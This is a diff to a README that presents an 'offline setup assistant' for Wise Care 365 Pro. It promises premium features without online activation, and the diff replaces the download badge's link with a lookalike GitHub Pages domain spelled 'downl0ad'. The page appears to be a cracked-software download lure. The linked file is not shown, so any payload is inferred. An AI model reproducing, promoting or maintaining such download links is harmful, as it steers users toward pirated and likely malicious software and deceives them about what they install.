@@ -1,6 +1,6 @@
 # Wise Care 365 Pro — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://wise-care-365-pro-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://wisecare-365pro-downl0ad.github.io/.github/)
 
 Wise Care 365 Pro is a comprehensive system optimization tool designed to improve Windows performance, privacy, and stability. This offline assistant helps deploy the software with all premium features without the need for online activation.
 
